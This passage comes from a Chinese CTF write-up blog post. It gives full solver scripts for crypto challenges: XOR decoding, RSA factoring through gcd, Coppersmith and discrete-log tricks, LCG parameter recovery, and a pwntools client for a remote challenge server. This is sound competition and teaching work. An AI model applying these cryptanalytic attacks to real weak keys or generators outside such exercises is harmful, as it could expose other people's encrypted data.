class="built_in">len</span>(cipher_set)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(cipher_set[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{it_is_flag_very_easyright_you_know!!}</p>
</blockquote>
<h2 id="baby-gcd"><a href="#baby-gcd" class="headerlink" title="baby_gcd"></a>baby_gcd</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">data = bytes_to_long(flag[:<span class="number">5</span>])</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> flag &lt; n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(flag, e, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(data, p, n))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">13363911977381658054715749670898309746795378579901910744548891514119930365598763675900066558885526891111578153852505468781338322217670232547796382694454636854667270681576447072504446292150761913091590029636528472343128844309564616107199650709984359476698570483265981944043392159470470399285710046127749035432951653658588305611925416558985714889031024015889163354845747839686029526924544667996738073746867634061472313832146768108912385319342837354867508476685733543811014072221007141421012887749322127577045821626420889053517061583804135616739747129097247525956401277280445776859357071596335365635129076760168060966607</span></span><br><span class="line"><span class="string">10223697039967223267682181717488147275927367118413751107492765199808800173812525650250727485499667865861401513584367265156007990663044846919938201443790340452739587600478171647549035134701499317817566764471386396555838202312403465048654949983406474954598930748110503439437344393592595276155454781057276134145504380796903813247840224774545523607884159231845974898250966348829961146367007792068641912245512595560267823445320076403263562739363031632062342189801065044810262234549063628866927777175935167665086806182399437659557762115546086926046162171444133449925064332483160873278631920623056454541931283939092643363769</span></span><br><span class="line"><span class="string">8407634300955121132761790421404876464439171066953178241717181127133987272675024893882593118056392128685766053032230696604294564590205211272173466649761038412652836039898073070956658795752143907494078331602633733508202164910668310281736798447342720590176784043217138366486935759740252492090711972604375828430662071251842986961821739442853955099030914125069036528452384768331862222815666911989108515279529962229787757202741446628933696420814510070543569524978792494846011056162739011324784470527582059752893749932914976314325653212342060502072125738929300327802791282926291615350754819628989468488062512660927247417470</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>小费马忘了，多亏尚师傅提醒，白白耽搁好多时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> gcd, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">13363911977381658054715749670898309746795378579901910744548891514119930365598763675900066558885526891111578153852505468781338322217670232547796382694454636854667270681576447072504446292150761913091590029636528472343128844309564616107199650709984359476698570483265981944043392159470470399285710046127749035432951653658588305611925416558985714889031024015889163354845747839686029526924544667996738073746867634061472313832146768108912385319342837354867508476685733543811014072221007141421012887749322127577045821626420889053517061583804135616739747129097247525956401277280445776859357071596335365635129076760168060966607</span></span><br><span class="line">c = <span class="number">10223697039967223267682181717488147275927367118413751107492765199808800173812525650250727485499667865861401513584367265156007990663044846919938201443790340452739587600478171647549035134701499317817566764471386396555838202312403465048654949983406474954598930748110503439437344393592595276155454781057276134145504380796903813247840224774545523607884159231845974898250966348829961146367007792068641912245512595560267823445320076403263562739363031632062342189801065044810262234549063628866927777175935167665086806182399437659557762115546086926046162171444133449925064332483160873278631920623056454541931283939092643363769</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">_c = <span class="number">8407634300955121132761790421404876464439171066953178241717181127133987272675024893882593118056392128685766053032230696604294564590205211272173466649761038412652836039898073070956658795752143907494078331602633733508202164910668310281736798447342720590176784043217138366486935759740252492090711972604375828430662071251842986961821739442853955099030914125069036528452384768331862222815666911989108515279529962229787757202741446628933696420814510070543569524978792494846011056162739011324784470527582059752893749932914976314325653212342060502072125738929300327802791282926291615350754819628989468488062512660927247417470</span></span><br><span class="line">data = bytes_to_long(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">p = gcd(_c-data, n)</span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<p>sage是我自己上密码学课自己写的库，想要实现一些sage里常用的函数    </p>
<blockquote>
<p>flag{212333333333333333333333333333333333333333333333333333333333}</p>
</blockquote>
<p>不过话说离散对数在$\mathbb{Z}^*_n$下简单是真的吗</p>
<h2 id="baby-RSA"><a href="#baby-RSA" class="headerlink" title="baby_RSA"></a>baby_RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag <span class="comment"># it means we hide the flag</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">textbookRSA</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = q</span><br><span class="line">        self.N = self.p * self.q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = invert(self.e, (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> m &lt; self.N</span><br><span class="line">        <span class="keyword">return</span> powmod(m, self.e, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">return</span> powmod(c, self.d, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vulnerability</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (self.p, self.q)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">enc = textbookRSA(getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>))</span><br><span class="line">c = enc.encrypt(bytes_to_long(flag))</span><br><span class="line">vul = enc.vulnerability()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(vul)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">64701533343688372690654293712295773404129813784694237799153926736962621435068947287072687977347837010274295586096313263626594906283456719476000887723325924200788009114768670335038095853813713911223601130462041497767344698895750519413521122224460972816020538747290579261708064784859421449573347263967997160490</span></span><br><span class="line"><span class="string">(9830899743055626691883675211456964737373662213776941723212592815656583592986430578241161039226354632749313979784000329125662593896949062022073761989419743, 11413016938938274789177683025211095871490834309326773658937859388628168661305423686103065519733651943178907824777739859479458155320334969216051745769010187)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{welcome_to_crypto}</p>
</blockquote>
<h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b, c</span>):</span></span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = bytes_to_long(flag)</span><br><span class="line">        self.state = self.seed</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstate</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.state = (a * self.state + b) % c</span><br><span class="line">            <span class="keyword">yield</span> self.state</span><br><span class="line"></span><br><span class="line">a, b, c = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">prng = LCG(a, b, c)</span><br><span class="line">random_states = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    random_states.append(<span class="built_in">next</span>(prng.getstate()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random_states[-<span class="number">6</span>:])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[36525894934655222529534846431164486292811941872906741964139901975056461298468, 44760375502060853569502415785606266854123925363856190745249656424194532471837, 99435840430130187938928057751136501366281085823686937625866664159577574922185, 32218838886452625692584366771934359409743014626478611858398172896703555179084, 75894967689014169953442519719124136776429102657940075770201298059192401503113, 59195822914392909511892901455781443859673595142363513265120745050537984795930]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>小小LCG，就是同余式简单移位和变化；这里只知道最后6个状态，可以推出<strong>模数</strong>，然后推出<strong>乘数</strong>和<strong>增量</strong></p>
<p>抄个la佬的脚本，抄个<a href="https://zeroyu.xyz/2018/11/02/Cracking-LCG/">大佬的博客</a>，方便日后行动</p>
<p>稍作修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span>(<span class="params">states, m, a</span>):</span></span><br><span class="line">    b = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * a) % m</span><br><span class="line">    <span class="keyword">return</span> m, a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span>(<span class="params">states, m</span>):</span></span><br><span class="line">    a = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], m) % m</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, m, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span>(<span class="params">states</span>):</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2 * t0 - t1 * t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    m = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N[i+1] = (A*N[i]+B) % M</span></span><br><span class="line"><span class="comment"># A,B,N均未知</span></span><br><span class="line">sequence = [<span class="number">36525894934655222529534846431164486292811941872906741964139901975056461298468</span>,</span><br><span class="line">            <span class="number">44760375502060853569502415785606266854123925363856190745249656424194532471837</span>,</span><br><span class="line">            <span class="number">99435840430130187938928057751136501366281085823686937625866664159577574922185</span>,</span><br><span class="line">            <span class="number">32218838886452625692584366771934359409743014626478611858398172896703555179084</span>,</span><br><span class="line">            <span class="number">75894967689014169953442519719124136776429102657940075770201298059192401503113</span>,</span><br><span class="line">            <span class="number">59195822914392909511892901455781443859673595142363513265120745050537984795930</span>]</span><br><span class="line">modulus, multiplier, increment = crack_unknown_modulus(sequence)</span><br><span class="line">t = sequence[-<span class="number">1</span>]	</span><br><span class="line">d = invert(multiplier, modulus)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    t = (((t - increment) % modulus) * d) % modulus</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(((t - increment) % modulus) * d))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999999999</span>):</span><br><span class="line">    _t = t + i * modulus</span><br><span class="line">    <span class="built_in">print</span>(_t)</span><br><span class="line">    flag = long_to_bytes(_t)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag, i)</span><br></pre></td></tr></table></figure>

<p>为什么爆破了好久出不来，如果flag很大的话，那这样是很难出来的；因为我们求出来的这256伪随机数，是在模c下的，相当于我们知道的第一个状态，只是和flag同余的一个数，如果flag稍微大点，就要利用同余等式去枚举</p>
<p>怎么会有这么不要脸的东西</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210902103314795.png" alt="image-20210902103314795"></p>
<p>暂时不会了，可能还有隐藏的套娃</p>
<hr>
<blockquote>
<p>flag{easyLcG!}</p>
</blockquote>
<p>哒哒哒哒哒</p>
<p><em>出题师傅看到我博客上写着unsolved就亲自指导了，也太nice了吧</em></p>
<p>求出来的模数还有一个公因子3，由于当时是通过getPrime取得的，所以正确模数应该是个素数</p>
<p>多整除个3就出了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">modulus = modulus // <span class="number">3</span></span><br><span class="line">t = sequence[-<span class="number">1</span>]</span><br><span class="line">d = invert(multiplier, modulus)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    t = (((t - increment) % modulus) * d) % modulus</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(t))</span><br></pre></td></tr></table></figure>

<p>应该是这里的问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211014132539513.png" alt="image-20211014132539513"></p>
<p>出来的可能是<code>k*n</code></p>
<h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_prime</span>(<span class="params">x</span>):</span></span><br><span class="line">    x += getPrime(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(x):</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">textbookRSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = generate_prime(p)</span><br><span class="line">        self.N = self.p * self.q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = invert(self.e, (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> m &lt; self.N</span><br><span class="line">        <span class="keyword">return</span> powmod(m, self.e, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">return</span> powmod(c, self.d, self.N)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">enc = textbookRSA(getPrime(<span class="number">512</span>))</span><br><span class="line">c, N = enc.encrypt(bytes_to_long(flag)), enc.N</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">40201544209443285599758189301888608601617874513443526548767757353443929151606722009781340637038714737084415903404819864837006813001196360676445857711384896521463808871500382419732201463547283765775164260612131076631479489522332895847086866318107250553614928244783290548532630896717593368294734888363949457545</span></span><br><span class="line"><span class="string">114741910526756640742537765026673760290351576565995368541784885613800696330239577637413166195346207752006116626595608590117773931022872753795837847792402503651299975473904115705416410939337300159818820792886315026470035856630685448353338137360972444341989751746886768451631705313621681461055224875826857697751</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题似曾相熟，开方已知p高位，CopperSmith一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">40201544209443285599758189301888608601617874513443526548767757353443929151606722009781340637038714737084415903404819864837006813001196360676445857711384896521463808871500382419732201463547283765775164260612131076631479489522332895847086866318107250553614928244783290548532630896717593368294734888363949457545</span></span><br><span class="line">n = <span class="number">114741910526756640742537765026673760290351576565995368541784885613800696330239577637413166195346207752006116626595608590117773931022872753795837847792402503651299975473904115705416410939337300159818820792886315026470035856630685448353338137360972444341989751746886768451631705313621681461055224875826857697751</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">kbits = <span class="number">202</span></span><br><span class="line">p0 = <span class="built_in">int</span>(iroot(n, <span class="number">2</span>)[<span class="number">0</span>]) &gt;&gt; kbits &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p0 + x</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p = p0 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{fermat_factorization_is_easy}</p>
</blockquote>
<p>emmmm费马分解，打扰了</p>
<h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">textbookRSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, p, q, e</span>):</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = q</span><br><span class="line">        self.N = self.p * self.q</span><br><span class="line">        self.e = getPrime(<span class="number">23</span>)</span><br><span class="line">        self.d = invert(self.e, (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> m &lt; self.N</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(m, self.e, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(c, self.d, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vulnerability</span>(<span class="params">self</span>):</span></span><br><span class="line">        vul = [<span class="built_in">pow</span>(<span class="number">2</span>, self.e, self.N), <span class="built_in">pow</span>(<span class="number">4</span>, self.e, self.N), <span class="built_in">pow</span>(<span class="number">8</span>, self.e, self.N)]</span><br><span class="line">        <span class="keyword">return</span> vul</span><br><span class="line"></span><br><span class="line">enc = textbookRSA(getPrime(<span class="number">27</span>), getPrime(<span class="number">27</span>), getPrime(<span class="number">23</span>))</span><br><span class="line">c, vul = enc.encrypt(bytes_to_long(flag)), enc.vulnerability()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(vul)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5661705370298896</span></span><br><span class="line"><span class="string">[6716715946456033, 1533036361566453, 2286114319392486]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>选择明文攻击（bushi）先获得n， Pollard’s kangaroo光滑的袋鼠（bushi）得到e，n好可以分解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">5661705370298896</span></span><br><span class="line">vul = [<span class="number">6716715946456033</span>, <span class="number">1533036361566453</span>, <span class="number">2286114319392486</span>]</span><br><span class="line">n = gcd(vul[<span class="number">0</span>]**<span class="number">2</span>-vul[<span class="number">1</span>], vul[<span class="number">0</span>]**<span class="number">3</span>-vul[<span class="number">2</span>])</span><br><span class="line">b = Mod(<span class="number">2</span>, n)</span><br><span class="line">vul0 = Mod(vul[<span class="number">0</span>], n)</span><br><span class="line">e = discrete_log_lambda(vul0, b, (getPrime(<span class="number">22</span>), getPrime(<span class="number">24</span>)))</span><br><span class="line">p, q = factor(n)[<span class="number">0</span>][<span class="number">0</span>], factor(n)[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{345y_}</p>
</blockquote>
<h2 id="FuckPython-RSA1"><a href="#FuckPython-RSA1" class="headerlink" title="FuckPython-RSA1"></a>FuckPython-RSA1</h2><p>nc开着，好评</p>
<p>emmmmm总感觉哪里不对</p>
<blockquote>
<p>nc 39.106.29.44 10106</p>
</blockquote>
<p>好在题目是正确的</p>
<p>比较简单，给一个nc，连上去，要python2，遍历256个字节；之后会得到RSA的公私钥和密文，解密就好</p>
<p>第一次因为窗口的原因，显示少了，解出来的flag不对，所以我都用脚本实现最后send过去。然后发现是wt的窗口显示少了，不过好在这道题用到的理论储备并没有出大问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 39.106.29.44 10106</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">space = [<span class="built_in">chr</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">sh = remote(<span class="string">&#x27;39.106.29.44&#x27;</span>, <span class="number">10106</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    <span class="comment"># md5(XXX + &#x27;6a7943b6c92e79&#x27;.decode(&#x27;hex&#x27;)) == 0e503536b5304015ab9594ec2a5b68af</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = proof[<span class="number">11</span>:<span class="number">25</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    HASH = proof[<span class="number">45</span>:<span class="number">77</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">3</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        x = head + tail</span><br><span class="line">        t = md5(x).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pem2txt</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp1:</span><br><span class="line">        fp1.write(s)</span><br><span class="line">    fp1.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fp2:</span><br><span class="line">        key = fp2.read()</span><br><span class="line">        rsakey = RSA.importKey(key)</span><br><span class="line">        <span class="comment"># &lt;_RSAobj @0x7f14f88bf410 n(2048),e,d,p,q,u,private&gt;</span></span><br><span class="line">        <span class="keyword">return</span> rsakey.n, rsakey.d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line"><span class="comment"># Crypto Challenge</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pem = sh.recvuntil(<span class="string">b&#x27;-----END RSA PRIVATE KEY-----&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;flag2 ==&gt; &#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&#x27;&#x27;Input your flag:&#x27;&#x27;&#x27;</span>)</span><br><span class="line">n, d = pem2txt(pem)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">sh.sendline(flag)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<blockquote>
